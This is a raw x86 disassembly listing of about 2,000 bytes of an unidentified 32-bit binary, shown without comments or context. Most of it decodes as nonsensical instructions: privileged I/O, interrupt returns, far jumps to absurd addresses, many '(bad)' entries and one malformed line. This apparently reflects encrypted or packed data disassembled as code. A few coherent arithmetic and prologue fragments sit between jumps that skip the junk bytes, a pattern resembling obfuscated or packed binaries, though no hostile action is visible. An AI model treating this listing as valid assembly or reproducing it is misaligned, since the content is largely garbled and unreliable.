  4051b0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4051b1:	inc    edi
  4051b2:	sti    
  4051b3:	sti    
  4051b4:	cdq    
  4051b5:	test   eax,0x4a11b79e
  4051ba:	xchg   esp,eax
  4051bb:	cmp    al,0x6f
  4051bd:	out    dx,eax
  4051be:	pusha  
  4051bf:	fstp   TBYTE PTR [ecx+0x60]
  4051c2:	jecxz  0x4051f0
  4051c4:	mov    edi,0xcdd50aa8
  4051c9:	sti    
  4051ca:	push   es
  4051cb:	(bad)  
  4051cc:	aam    0xd7
  4051ce:	and    al,0xc4
  4051d0:	iret   
  4051d1:	(bad)  
  4051d2:	lahf   
  4051d3:	stc    
  4051d4:	cs scas al,BYTE PTR es:[edi]
  4051d6:	and    eax,0x7ac5ed46
  4051db:	enter  0x1246,0x4a
  4051df:	sar    BYTE PTR [ebx],1
  4051e1:	std    
  4051e2:	int    0x42
  4051e4:	int    0x27
  4051e6:	push   es
  4051e7:	aam    0xff
  4051e9:	jle    0x40519e
  4051eb:	js     0x4051be
  4051ed:	aaa    
  4051ee:	in     al,dx
  4051ef:	in     al,dx
  4051f0:	and    DWORD PTR [edx+0x38],esp
  4051f3:	cmp    BYTE PTR [edi-0x1e],ch
  4051f6:	adc    cl,dl
  4051f8:	int3   
  4051f9:	jbe    0x405224
  4051fb:	daa    
  4051fc:	outs   dx,DWORD PTR ds:[esi]
  4051fd:	dec    ebp
  4051fe:	push   0xb300d6cb
  405203:	inc    ebp
  405204:	sub    dh,BYTE PTR [eax+esi*8+0x2a]
  405208:	stos   DWORD PTR es:[edi],eax
  405209:	aas    
  40520a:	xchg   edx,ecx
  40520c:	xchg   edi,eax
  40520d:	(bad)  
  40520e:	les    eax,FWORD PTR [edx+edx*8]
  405211:	sbb    dh,bh
  405213:	add    eax,0x9e5c04d
  405218:	inc    ebx
  405219:	out    dx,eax
  40521a:	inc    eax
  40521b:	and    eax,0xa168ef48
  405220:	or     BYTE PTR [edi+0x3e],cl
  405223:	xor    BYTE PTR [ecx],cl
  405225:	sub    DWORD PTR [eax-0x3c],0xec9f845e
  40522c:	test   al,0x7c
  40522e:	mov    WORD PTR [ecx+eax*1+0x53],ds
  405232:	sti    
  405233:	sub    BYTE PTR [edi],dh
  405235:	outs   dx,BYTE PTR ds:[esi]
  405236:	mov    al,0xe6
  405238:	xchg   esp,eax
  405239:	inc    ebx
  40523a:	int    0x89
  40523c:	inc    ebp
  40523d:	or     al,0x8b
  40523f:	inc    ebp
  405240:	cld    
  405241:	mov    esi,DWORD PTR [ebp-0x8]
  405244:	xor    eax,edx
  405246:	xor    esi,edx
  405248:	add    eax,ecx
  40524a:	add    esi,ecx
  40524c:	imul   eax,esi
  40524f:	mov    esi,DWORD PTR [ebp+0xc]
  405252:	cmp    esi,eax
  405254:	mov    eax,DWORD PTR [ebp-0x4]
  405257:	je     0x405025
  40525d:	xor    eax,edx
  40525f:	add    eax,ecx
  405261:	mov    ecx,DWORD PTR [ebp+0xc]
  405264:	imul   eax,ecx
  405267:	add    eax,DWORD PTR [ebp+0x8]
  40526a:	mov    DWORD PTR [ebp+0xc],eax
  40526d:	mov    eax,DWORD PTR [ebp+0xc]
  405270:	pop    esi
  405271:	leave  
  405272:	ret    0x8
  405275:	push   ebp
  405276:	mov    ebp,esp
  405278:	push   ecx
  405279:	jmp    0x4055dc
  40527e:	sahf   
  40527f:	jb     0x40520d
  405281:	push   edx
  405282:	pop    esp
  405283:	jl     0x4052ed
  405285:	jb     0x405286
  405287:	ret    
  405288:	mov    ebx,0xeb325439
  40528d:	jnp    0x4052ea
  40528f:	sub    bh,BYTE PTR [esi+0x7e]
  405292:	les    edi,FWORD PTR [ecx+0x7e]
  405295:	jle    0x405315
  405297:	add    ebp,DWORD PTR [esi]
  405299:	sub    ebp,DWORD PTR [esp+eax*4-0x5f1b793f]
  4052a0:	iret   
  4052a1:	sub    dh,BYTE PTR [ebx+0x2581f37c]
  4052a7:	or     DWORD PTR [ebx],ecx
  4052a9:	out    0x6f,eax
  4052ab:	hlt    
  4052ac:	in     eax,0x3d
  4052ae:	out    dx,eax
  4052af:	and    al,0xf0
  4052b1:	fs iret 
  4052b3:	lahf   
  4052b4:	fisub  DWORD PTR [esi]
  4052b6:	dec    ebx
  4052b7:	imul   eax,DWORD PTR [edx],0xffffffca
  4052ba:	(bad)  
  4052bb:	pop    esi
  4052bc:	push   ebx
  4052bd:	adc    eax,0x369aed61
  4052c2:	jle    0x4052da
  4052c4:	cld    
  4052c5:	pop    esi
  4052c6:	push   eax
  4052c7:	jle    0x4052d1
  4052c9:	push   si
  4052cb:	xchg   edx,eax
  4052cc:	sub    ecx,DWORD PTR [ebp+0x2f89ad0b]
  4052d2:	leave  
  4052d3:	push   edx
  4052d4:	sub    edi,DWORD PTR [ebx-0x51]
  4052d7:	sbb    edi,DWORD PTR [edi+0x64]
  4052da:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4052db:	icebp  
  4052dc:	and    eax,0xb06d0e7c
  4052e1:	scas   al,BYTE PTR es:[edi]
  4052e2:	mov    BYTE PTR [eax],ch
  4052e4:	cld    
  4052e5:	mov    ds:0x8c4a47e9,eax
  4052ea:	push   ss
  4052eb:	iret   
  4052ec:	mov    al,ds:0x879561fc
  4052f1:	sub    bl,ah
  4052f3:	in     al,dx
  4052f4:	dec    ebx
  4052f5:	pushf  
  4052f6:	inc    eax
  4052f7:	sub    BYTE PTR ss:0x26b64527,ah
  4052fe:	inc    edi
  4052ff:	xchg   ebp,eax
  405300:	sub    ebp,DWORD PTR [eax-0x72]
  405303:	loop   0x4052a5
  405305:	pop    ecx
  405306:	bound  eax,QWORD PTR [esi-0x308d6e62]
  40530c:	int    0xb2
  40530e:	mov    edx,?
  405310:	mov    ebp,0x396c3c74
  405315:	jmp    0xbc3bddf0
  40531a:	(bad)  
  40531b:	push   ecx
  40531c:	adc    cl,BYTE PTR [ebp+0x30b35cce]
  405322:	push   0xd8587a6e
  405327:	pusha  
  405328:	into   
  405329:	dec    esp
  40532a:	call   edx
  40532c:	or     dh,BYTE PTR [edx]
  40532e:	jae    0x40532c
  405330:	jb     0x4052d9
  405332:	popf   
  405333:	pop    esp
  405334:	lods   eax,DWORD PTR ds:[esi]
  405335:	mov    dh,0x5a
  405337:	adc    DWORD PTR [edx+0x583c2202],0xdda32e6b
  405341:	xchg   ebx,edi
  405343:	inc    edx
  405344:	and    eax,0x303be586
  405349:	in     eax,dx
  40534a:	pop    ebx
  40534b:	cpuid  
  40534d:	xchg   esp,eax
  40534e:	pop    ebx
  40534f:	popf   
  405350:	or     bh,al
  405352:	adc    DWORD PTR [ebp+ebp*2-0x2d],edi
  405356:	cdq    
  405357:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405358:	add    eax,0xf5b93479
  40535d:	mov    eax,0x9d901cad
  405362:	xor    eax,0xb9c02c1a
  405367:	pop    esp
  405368:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405369:	jbe    0x40536b
  40536b:	xchg   esp,eax
  40536c:	dec    ebx
  40536d:	std    
  40536e:	cmp    eax,esi
  405370:	jne    0x405384
  405372:	aad    0x37
  405374:	in     eax,0x32
  405376:	push   eax
  405377:	jnp    0x405342
  405379:	aas    
  40537a:	push   ds
  40537b:	and    eax,0x983cfde8
  405380:	add    esp,esi
  405382:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405383:	xchg   edi,eax
  405384:	mov    ds:0xf14e0bbf,eax
  405389:	hlt    
  40538a:	jmp    0xc1b5feb2
  40538f:	or     eax,0x92d29537
  405394:	jmp    0x78dcd04c
  405399:	push   ebx
  40539a:	dec    esp
  40539b:	stos   DWORD PTR es:[edi],eax
  40539c:	aam    0x7
  40539e:	inc    edx
  40539f:	imul   edx,DWORD PTR [eax+0x39],0xffffffc8
  4053a3:	sub    eax,0xda20b4bc
  4053a8:	mov    ds:0x6918fc92,eax
  4053ad:	bound  edi,QWORD PTR [ebp+ecx*4+0x1e]
  4053b1:	or     BYTE PTR [ebx*8-0x697baa7c],dh
  4053b8:	stos   BYTE PTR es:[edi],al
  4053b9:	sbb    ebp,DWORD PTR es:[ecx]
  4053bc:	das    
  4053bd:	sbb    DWORD PTR [edx],0x26
  4053c0:	mov    ebx,0x7631c319
  4053c5:	adc    al,0xf6
  4053c7:	pusha  
  4053c8:	xor    DWORD PTR [ecx+0x7ecac566],edx
  4053ce:	cmp    BYTE PTR [ebx+ebx*8+0x160ea711],cl
  4053d5:	iret   
  4053d6:	xor    DWORD PTR [eax-0x217f6ca5],0x64
  4053dd:	pop    es
  4053de:	jl     0x405393
  4053e0:	xchg   edx,eax
  4053e1:	jge    0x405430
  4053e3:	into   
  4053e4:	mov    bl,0x62
  4053e6:	mov    ecx,0xcdf05afe
  4053eb:	cmp    DWORD PTR [ebx],edx
  4053ed:	(bad)  
  4053ee:	jmp    0x9735:0x8574f2ca
  4053f5:	enter  0x4ea0,0x6
  4053f9:	aad    0x69
  4053fb:	pop    ebx
  4053fc:	sbb    BYTE PTR [edi+0x47a2d37d],dl
  405402:	sub    bh,BYTE PTR [ecx-0xa]
  405405:	xchg   ecx,eax
  405406:	xchg   edi,eax
  405407:	sub    ch,BYTE PTR [edi+0x2f]
  40540a:	adc    eax,DWORD PTR [ebx+0x53]
  40540d:	lock or DWORD PTR [ecx+0x16ecc977],0xffffffe3
  405415:	add    eax,0x8ec0b3f9
  40541a:	pusha  
  40541b:	out    0xa1,eax
  40541d:	mov    dh,0xa7
  40541f:	push   ss
  405420:	int3   
  405421:	dec    esi
  405422:	sub    dh,dl
  405424:	push   eax
  405425:	jecxz  0x40542a
  405427:	sub    ecx,DWORD PTR [ebx+0x2ff36550]
  40542d:	fstp   QWORD PTR [edi]
  40542f:	rol    BYTE PTR [edi-0x7d],cl
  405432:	test   BYTE PTR [edx],cl
  405434:	cli    
  405435:	mov    ch,0xab
  405437:	sub    eax,0xf0e8554c
  40543c:	in     eax,0xc3
  40543e:	pop    ds
  40543f:	sub    eax,0xb5162d8e
  405444:	inc    edx
  405445:	lock pop ecx
  405447:	in     eax,dx
  405448:	inc    ebp
  405449:	and    BYTE PTR [esi],al
  40544b:	pop    edi
  40544c:	or     BYTE PTR [edi-0x2f],al
  40544f:	shl    BYTE PTR [ecx],1
  405451:	or     BYTE PTR [eax-0x19],bh
  405454:	pop    edi
  405455:	jmp    0xbafae0b7
  40545a:	out    dx,eax
  40545b:	pop    edi
  40545c:	inc    edi
  40545d:	xlat   BYTE PTR ds:[ebx]
  40545e:	mov    DWORD PTR [ebp+0x256f9c60],ebx
  405464:	sbb    edi,DWORD PTR [ebp-0x23]
  405467:	daa    
  405468:	jb     0x405434
  40546a:	sbb    ecx,edx
  40546c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40546d:	fwait
  40546e:	push   eax
  40546f:	retf   0xc5ca
  405472:	jle    0x40549d
  405474:	push   edx
  405475:	iret   
  405476:	mov    dl,0xa2
  405478:	cmp    edx,DWORD PTR [esp+eiz*4+0xb89a88f]
  40547f:	or     al,cl
  405481:	xor    ebp,DWORD PTR [ebx+ecx*2-0x6]
  405485:	add    dl,BYTE PTR [edi+esi*4+0x45]
  405489:	cmp    DWORD PTR ds:[edi+0x1b],0x1b
  40548e:	mov    bh,0xad
  405490:	ror    DWORD PTR [esi],cl
  405492:	jae    0x405434
  405494:	shl    DWORD PTR [eax],cl
  405496:	out    dx,al
  405497:	or     BYTE PTR [ebp-0x54],bh
  40549a:	add    eax,0xdf3a1d0f
  40549f:	lods   al,BYTE PTR ds:[esi]
  4054a0:	xor    eax,0xe9df7108
  4054a5:	adc    edi,DWORD PTR [edi+0x7d604020]
  4054ab:	leave  
  4054ac:	mov    DWORD PTR [edx],ecx
  4054ae:	mov    eax,0x5769c756
  4054b3:	pop    edi
  4054b4:	loop   0x40548c
  4054b6:	xchg   ebp,eax
  4054b7:	nop
  4054b8:	mov    eax,0x8d96f362
  4054bd:	fcom   st(0)
  4054bf:	sti    
  4054c0:	in     eax,0xdf
  4054c2:	jg     0x4054dc
  4054c4:	and    cl,bh
  4054c6:	adc    BYTE PTR es:[edx+0x30],bh
  4054ca:	sbb    BYTE PTR [edi+0xf3e0b1e],0xe5
  4054d1:	repnz frstor [esi-0x1b22e6e2]
  4054d8:	leave  
  4054d9:	repnz sub ah,dh
  4054dc:	xchg   edx,eax
  4054dd:	(bad)  
  4054df:	sub    BYTE PTR [edi+ebp*4],ah
  4054e2:	(bad)  
  4054e3:	fbld   TBYTE PTR [ebx+0x3f]
  4054e6:	adc    al,BYTE PTR [ebx-0x1e]
  4054e9:	pop    edi
  4054ea:	sub    ebx,DWORD PTR [eax-0x76]
  4054ed:	pop    eax
  4054ee:	pop    edx
  4054ef:	mov    ebx,DWORD PTR [eax]
  4054f1:	pushf  
  4054f2:	xchg   esp,eax
  4054f3:	fimul  DWORD PTR [eax]
  4054f5:	test   DWORD PTR [bp-0x3d],0x9a85f061
  4054fd:	leave  
  4054fe:	enter  0x71ef,0xbb
  405502:	lods   eax,DWORD PTR ds:[esi]
  405503:	in     eax,dx
  405504:	arpl   WORD PTR [edx+esi*4+0x3c49f314],si
  40550b:	lea    ecx,[esp+ebx*4]
  40550e:	mov    BYTE PTR [ebp+0x3558f89d],dh
  405514:	scas   al,BYTE PTR es:[edi]
  405515:	inc    edi
  405516:	xchg   esi,eax
  405517:	add    DWORD PTR [edi],0x3a
  40551a:	mov    eax,0xf636c354
  40551f:	pop    ebp
  405520:	aas    
  405521:	bound  ecx,QWORD PTR [edi-0x5f9edd74]
  405527:	dec    ebx
  405528:	int    0x60
  40552a:	in     eax,0x2e
  40552c:	push   eax
  40552d:	retf   
  40552e:	addr16 mov ebx,0x5afc1d1e
  405534:	xor    cl,ah
  405536:	loopne 0x405591
  405538:	jbe    0x405538
  40553a:	js     0x405586
  40553c:	mov    esp,esi
  40553e:	hlt    
  40553f:	pusha  
  405540:	xchg   edx,eax
  405541:	sbb    eax,0x50a3a9ed
  405546:	test   BYTE PTR [eax+0x4c1f9b3f],cl
  40554c:	push   ecx
  40554d:	mov    edi,0x515f930d
  405552:	shl    BYTE PTR [ebp+0x27],cl
  405555:	(bad)  
  405556:	xlat   BYTE PTR ds:[ebx]
  405557:	and    DWORD PTR [esi+ecx*1],0xffffff9e
  40555b:	adc    al,0x60
  40555d:	cmp    eax,0x7486b7d4
  405562:	ins    BYTE PTR es:[edi],dx
  405563:	push   ss
  405564:	jbe    0x405536
  405566:	sub    DWORD PTR [ecx-0x71],eax
  405569:	and    DWORD PTR [edx],edx
  40556b:	fisubr DWORD PTR [eax-0x614fe787]
  405571:	xchg   esp,eax
  405572:	and    esp,esp
  405574:	sbb    BYTE PTR [ecx],al
  405576:	test   BYTE PTR [esi+0x68cedd9e],ch
  40557c:	adc    al,0x8d
  40557e:	cmp    bl,ah
  405580:	or     eax,0x9254e4d1
  405585:	xor    ebp,DWORD PTR [ebx+ebx*2+0x5c]
  405589:	and    BYTE PTR [ebx+eiz*8+0x4e],dl
  40558d:	(bad)  
  40558e:	mov    esi,0xa1afb32b
  405593:	mov    esp,0xb1fa1243
  405598:	inc    edi
  405599:	pop    ecx
  40559a:	pop    eax
  40559b:	std    
  40559c:	mov    edi,0x780806a4
  4055a1:	and    al,0xdc
  4055a3:	lods   eax,DWORD PTR ds:[esi]
  4055a4:	shl    BYTE PTR [eax-0x12],cl
  4055a7:	push   ebx
  4055a8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4055a9:	out    dx,eax
  4055aa:	sub    esi,ecx
  4055ac:	push   0x57
  4055ae:	or     ch,ah
  4055b0:	lds    esi,FWORD PTR [eax-0x783ec45c]
  4055b6:	dec    edx
  4055b7:	mov    ebp,0x82450362
  4055bc:	mov    BYTE PTR [edx-0x73],ch
  4055bf:	sub    eax,0xe6870c25
  4055c4:	stos   BYTE PTR es:[edi],al
  4055c5:	adc    edi,DWORD PTR [edx-0x51]
  4055c8:	pop    ebx
  4055c9:	popf   
  4055ca:	jb     0x405630
  4055cc:	mov    BYTE PTR [edx],bh
  4055ce:	mov    ebp,0x284f449a
  4055d3:	rcl    ebp,0xdd
  4055d6:	std    
  4055d7:	adc    eax,0xb26c45d3
  4055dc:	push   ecx
  4055dd:	mov    eax,0x5a3fc9f
  4055e2:	mov    DWORD PTR [ebp-0x4],eax
  4055e5:	mov    DWORD PTR ds:0x4344f3,0x3619
  4055ef:	mov    ecx,DWORD PTR [ebp-0x4]
  4055f2:	jmp    0x405955
  4055f7:	xchg   esi,eax
  4055f8:	jb     0x405627
  4055fa:	jg     0x4055e9
  4055fc:	dec    ecx
  4055fd:	mov    esp,0x8b1aac73
  405602:	cs iretw 
  405605:	pushf  
  405606:	dec    eax
  405607:	and    DWORD PTR [esi],esi
  405609:	jle    0x405689
  40560b:	les    edi,FWORD PTR [ecx+0x7e]
  40560e:	jle    0x4055e0
  405610:	adc    BYTE PTR [esi-0x3704090b],0xe0
  405617:	mov    edx,0x2317e4a4
  40561c:	data16 in al,0xc5
  40561f:	mov    esp,0x90f77b3a
  405624:	sub    al,0x6d
  405626:	dec    esp
  405627:	mov    esp,0x404fc8e
  40562c:	je     0x4055fb
  40562e:	or     al,BYTE PTR [edi-0x5341210c]
  405634:	in     al,0xba
  405636:	xor    DWORD PTR [ebp-0x54193475],0x3
  40563d:	add    al,0x6
  40563f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405640:	mov    bl,0xd9
  405642:	leave  
  405643:	rol    DWORD PTR [edx],0xe9
  405646:	aam    0x1a
  405648:	adc    BYTE PTR [eax+0x654966e0],0xcc
  40564f:	outs   dx,DWORD PTR ds:[esi]
  405650:	adc    eax,ebx
  405652:	retf   
  405653:	or     eax,0xb37f0ec7
  405658:	mov    bh,BYTE PTR [esi+edi*2-0x41d7f30f]
  40565f:	stos   BYTE PTR es:[edi],al
  405660:	es cmp ch,0xf9
  405664:	lods   al,BYTE PTR ds:[esi]
  405665:	or     ebp,DWORD PTR [eax]
  405667:	jg     0x405673
  405669:	test   al,0x36
  40566b:	jle    0x405607
  40566d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40566e:	xchg   esi,eax
  40566f:	in     eax,0x8e
  405671:	inc    edi
  405672:	add    dh,BYTE PTR [edi+0x70]
  405675:	push   edx
  405676:	lods   al,BYTE PTR ds:[esi]
  405677:	cli    
  405678:	sub    esi,DWORD PTR [edx-0x4f]
  40567b:	fidivr WORD PTR [esi+esi*8]
  40567e:	dec    esp
  40567f:	arpl   cx,di
  405681:	sub    DWORD PTR [esi],edi
  405683:	mov    esp,0x469ade8d
  405688:	mov    ah,0xd0
  40568a:	or     bh,BYTE PTR [esi+0x32cde1b4]
  405690:	pop    ss
  405691:	(bad)  
  405692:	mul    BYTE PTR [ecx+0xc]
  405695:	add    DWORD PTR [edi-0x32],esi
  405698:	or     BYTE PTR [ecx-0x6f],bh
  40569b:	data16 jo 0x405719
  40569e:	xchg   esp,eax
  40569f:	adc    al,BYTE PTR [ebp+eax*8+0x11]
  4056a3:	(bad)  
  4056a4:	ror    BYTE PTR ds:0x1882fa5,1
  4056aa:	out    0x3d,al
  4056ac:	retf   0xca71
  4056af:	xchg   edx,eax
  4056b0:	inc    edi
  4056b1:	adc    BYTE PTR [esi+0x1d150ba3],al
  4056b7:	xlat   BYTE PTR ds:[ebx]
  4056b8:	iret   
  4056b9:	ret    
  4056ba:	or     DWORD PTR [eax-0x67],ebp
  4056bd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4056be:	cmp    cl,BYTE PTR [esi-0x5f]
  4056c1:	or     bh,ch
  4056c3:	test   BYTE PTR [ecx-0x3f],bh
  4056c6:	xor    ch,ch
  4056c8:	(bad)  
  4056c9:	mov    bh,ch
  4056cb:	retf   
  4056cc:	loopne 0x4056bc
  4056ce:	xchg   ebp,eax
  4056cf:	xor    dl,al
  4056d1:	enter  0xfda4,0x1c
  4056d5:	and    ebx,DWORD PTR [edi-0x53]
  4056d8:	or     al,BYTE PTR [eax]
  4056da:	sbb    ah,BYTE PTR [edx+esi*4]
  4056dd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4056de:	(bad)  
  4056df:	enter  0xf2ff,0x6d
  4056e3:	les    esp,FWORD PTR [ebx-0x64c76676]
  4056e9:	mov    ah,0xce
  4056eb:	add    ch,BYTE PTR [eax+0x5249746c]
  4056f1:	mov    cl,0xb0
  4056f3:	gs cmc 
  4056f5:	mov    BYTE PTR [ebx+0x72],al
  4056f8:	mov    ebx,0x40efb7cc
  4056fd:	leave  
  4056fe:	pop    edx
  4056ff:	ficomp WORD PTR [ebx-0x23b0fcca]
  405705:	loope  0x405779
  405707:	sub    eax,0x661dbb97
  40570c:	or     bh,dh
  40570e:	jo     0x4056f1
  405710:	dec    ecx
  405711:	or     eax,0x8295a0c6
  405716:	outs   dx,DWORD PTR ds:[esi]
  405717:	in     eax,0x28
  405719:	add    bl,BYTE PTR [esi]
  40571b:	fnsave [esi]
  40571d:	push   esi
  40571e:	sub    ch,BYTE PTR [edx+edx*2]
  405721:	cmp    al,0x9a
  405723:	(bad)  
  405725:	int3   
  405726:	jmp    0xd8e1:0x4abb3a6e
  40572d:	daa    
  40572e:	and    al,0x58
  405730:	pop    ecx
  405731:	jg     0x40578f
  405733:	jo     0x40572a
  405735:	data16 mov bl,0x8a
  405738:	in     al,0xc7
  40573a:	pop    ds
  40573b:	mov    ebx,0xa8014f3
  405740:	add    ah,BYTE PTR ds:[ecx-0x1f]
  405744:	mov    ds:0x61b31155,al
  405749:	lea    edx,[eax-0x79]
  40574c:	ins    DWORD PTR es:[edi],dx
  40574d:	retf   0x14d3
  405750:	xchg   BYTE PTR [eax],ch
  405752:	pop    ds
  405753:	ja     0x40576e
  405755:	xchg   esi,eax
  405756:	or     al,0xe4
  405758:	pusha  
  405759:	jp     0x405755
  40575b:	arpl   WORD PTR ds:0x26485933,bp
  405761:	or     ebp,DWORD PTR [edx-0x19]
  405764:	xor    eax,0x46fc61
  405769:	mov    al,ds:0x13542c62
  40576e:	mov    cl,0x5a
  405770:	int    0x1f
  405772:	push   edx
  405773:	pushf  
  405774:	mov    bh,BYTE PTR [esi]
  405776:	pop    ebp
  405777:	pop    eax
  405778:	jge    0x40579f
  40577a:	mov    esp,0x3fdc688c
  40577f:	mov    bh,0x6c
  405781:	sahf   
  405782:	enter  0x18cb,0xc8
  405786:	jne    0x4057ec
  405788:	cmp    DWORD PTR [edx-0x6b],0xffffffe8
  40578c:	les    ebx,FWORD PTR [esi-0x5d4d1fac]
  405792:	mov    esp,0x6ad54b73
  405797:	fst    QWORD PTR [edi+0x2]
  40579a:	imul   eax,DWORD PTR [ecx],0xc1290e7e
  4057a0:	pop    ecx
  4057a1:	xor    BYTE PTR [ebx],ch
  4057a3:	out    dx,al
  4057a4:	in     eax,dx
  4057a5:	cdq    
  4057a6:	je     0x4057df
  4057a8:	push   edx
  4057a9:	mov    ch,0xd0
  4057ab:	(bad)
  4057ae:	xor    al,0x1b
  4057b0:	hlt    
  4057b1:	and    eax,0x398e0af8
  4057b6:	jnp    0x40575b
  4057b8:	and    DWORD PTR [edx+edx*1-0x72840e64],ecx
  4057bf:	test   eax,0x7f61627d
  4057c4:	push   eax
  4057c5:	ins    DWORD PTR es:[edi],dx
  4057c6:	test   DWORD PTR [edi],0x9cc8024c
  4057cc:	or     al,dl
  4057ce:	(bad)  
  4057cf:	pushf  
  4057d0:	aas    
  4057d1:	test   DWORD PTR [ebp-0x2e],esi
  4057d4:	push   eax
  4057d5:	inc    ecx
  4057d6:	lods   eax,DWORD PTR ds:[esi]
  4057d7:	xor    eax,0xebbbbe3d
  4057dc:	pop    ebx
  4057dd:	imul   esi,DWORD PTR [edx-0x587306b0],0x145ac9bd
  4057e7:	repz and esi,DWORD PTR [esp+esi*1+0x2e]
  4057ec:	pop    es
  4057ed:	(bad)  
  4057ee:	dec    esi
  4057ef:	xchg   esi,eax
  4057f0:	enter  0xf94b,0x17
  4057f4:	dec    esp
  4057f5:	fimul  WORD PTR [ecx-0x7d]
  4057f8:	push   ebx
  4057f9:	inc    ebx
  4057fa:	cmp    dl,bl
  4057fc:	jp     0x4057fe
  4057fe:	sub    al,0x7c
  405800:	dec    esp
  405801:	stos   BYTE PTR es:[edi],al
  405802:	add    dl,BYTE PTR [edi+0x78]
  405805:	icebp  
  405806:	sbb    ah,cl
  405808:	inc    eax
  405809:	xor    eax,0x4d273e99
  40580e:	jnp    0x405805
  405810:	sbb    dl,BYTE PTR [esi+0x6c4e33a6]
  405816:	out    0x72,al
  405818:	inc    edi
  405819:	xchg   esi,eax
  40581a:	stos   BYTE PTR es:[edi],al
  40581b:	lds    ebp,FWORD PTR [bx+di]
  40581e:	or     DWORD PTR [edi-0x866aad4],eax
  405824:	inc    edi
  405825:	test   ah,cl
  405827:	add    al,BYTE PTR [ebx]
  405829:	inc    ebx
  40582a:	xor    bh,BYTE PTR [ecx+0x29]
  40582d:	pop    ecx
  40582e:	pusha  
  40582f:	mov    ds:0x67d70c49,eax
  405834:	sbb    DWORD PTR [ecx+0x2632f3a1],edi
  40583a:	cli    
  40583b:	fimul  DWORD PTR [edx+0x0]
  40583e:	mov    ecx,0xf99985f1
  405843:	bound  edx,QWORD PTR [eax+0x3]
  405846:	jmp    0xadc3:0xd042badc
  40584d:	leave  
  40584e:	jmp    0xa5c28b08
  405853:	popf   
  405854:	call   0x590:0xb9e00f67
  40585b:	daa    
  40585c:	pop    ds
  40585d:	hlt    
  40585e:	outs   dx,DWORD PTR ds:[esi]
  40585f:	add    eax,0x16217313
  405864:	pop    ecx
  405865:	mov    edi,0x9ac87ec1
  40586a:	imul   edx,DWORD PTR [esi+0x5212778b],0xfffffff3
  405871:	xor    DWORD PTR [ebx+0x46],0xefc43898
  405878:	xor    al,BYTE PTR ds:0xfa24f92f
  40587e:	out    dx,al
  40587f:	and    eax,0xedc813be
  405884:	aad    0xcd
  405886:	adc    eax,0x156be5b1
  40588b:	fcomp  DWORD PTR [ebx+ecx*8-0x2fcde392]
  405892:	imul   edi,DWORD PTR [ecx-0x1ed3c21f],0xd2fefde1
  40589c:	add    DWORD PTR [edi],ebp
  40589e:	cmp    eax,0xc40c7f4a
  4058a3:	imul   ebp,DWORD PTR [edi-0x35],0xc148373f
  4058aa:	push   esi
  4058ab:	repnz stos BYTE PTR es:[edi],al
  4058ad:	fdivr  QWORD PTR [edx-0x49cbf282]
  4058b3:	xor    BYTE PTR [edx+0x15],cl
  4058b6:	ret    0x12c3
  4058b9:	sbb    dh,dh
  4058bb:	push   esp
  4058bc:	dec    eax
  4058bd:	dec    edi
  4058be:	xchg   ah,bh
  4058c0:	dec    esi
  4058c1:	je     0x4058f1
  4058c3:	bound  ebx,QWORD PTR [esi-0x52]
  4058c6:	mov    esi,0x2e51fc3f
  4058cb:	dec    edi
  4058cc:	push   esp
  4058cd:	pop    ss
  4058ce:	ds and eax,0x9729b0ae
  4058d4:	(bad)
  4058d7:	push   0x12
  4058d9:	pop    ss
  4058da:	push   0x53
  4058dc:	or     al,0xeb
  4058de:	inc    ebx
  4058df:	mov    ds:0x856c9174,al
  4058e4:	cmp    BYTE PTR [esp+esi*2+0x1996ebda],dh
  4058eb:	cwde   
  4058ec:	dec    edx
  4058ed:	push   edi
  4058ee:	cs and cl,ah
  4058f1:	mov    dl,0xc2
  4058f3:	jno    0x405907
  4058f5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4058f6:	les    ebx,FWORD PTR [eax+0x7b07e05d]
  4058fc:	xlat   BYTE PTR ds:[ebx]
  4058fd:	jmp    0x92556696
  405902:	pushf  
  405903:	fwait
  405904:	out    dx,al
  405905:	or     BYTE PTR [ecx-0x2e3ac3a0],ch
  40590b:	add    eax,0x8ed1cd9e
  405910:	iret   
  405911:	xchg   ebx,eax
  405912:	scas   eax,DWORD PTR es:[edi]
  405913:	mov    ds:0xfcb4a1eb,eax
  405918:	pop    esi
  405919:	or     edx,ecx
  40591b:	push   0x8cd4836a
  405920:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405921:	push   cs
  405922:	cmp    eax,esi
  405924:	jle    0x40599b
  405926:	fld    DWORD PTR [eax+0x6c]
  405929:	inc    esi
  40592a:	pop    ebx
  40592b:	and    DWORD PTR [edi-0x3b],edx
  40592e:	xchg   ecx,eax
  40592f:	push   ecx
  405930:	mov    ds:0x9a55d2be,al
  405935:	sbb    eax,0xe1ec360d
  40593a:	nop
  40593b:	into   
  40593c:	add    edx,esp
  40593e:	and    ebp,DWORD PTR [ebx+0x3c1e1af8]
  405944:	sbb    al,0xaf
  405946:	mov    al,0x89
  405948:	sub    DWORD PTR [ebx-0x4d8e01b2],0x10d2c09a
  405952:	add    al,0x6
  405954:	sub    al,bh
  405956:	inc    ebp
  405957:	clc    
  405958:	cmp    DWORD PTR [edi+0x0],ecx
  40595b:	add    bh,al
  40595d:	add    eax,0x4345d3
  405962:	dec    edx
  405963:	and    al,BYTE PTR [eax]
  405965:	add    cl,ch
  405967:	pop    esi
  405968:	add    eax,DWORD PTR [eax]
  40596a:	add    BYTE PTR [edx+0x71b8a1ab],bh
  405970:	pop    esp
  405971:	arpl   WORD PTR [ebp-0x4d872e44],si
  405977:	dec    esi
  405978:	add    DWORD PTR [edx-0x54],esi
  40597b:	out    dx,eax
  40597c:	xor    DWORD PTR [esi+0x7e],edi
  40597f:	les    edi,FWORD PTR [ecx+0x7e]
  405982:	jle    0x40598d
  405984:	imul   ecx,ebp,0xf6de22c0
  40598a:	xor    al,0xaf
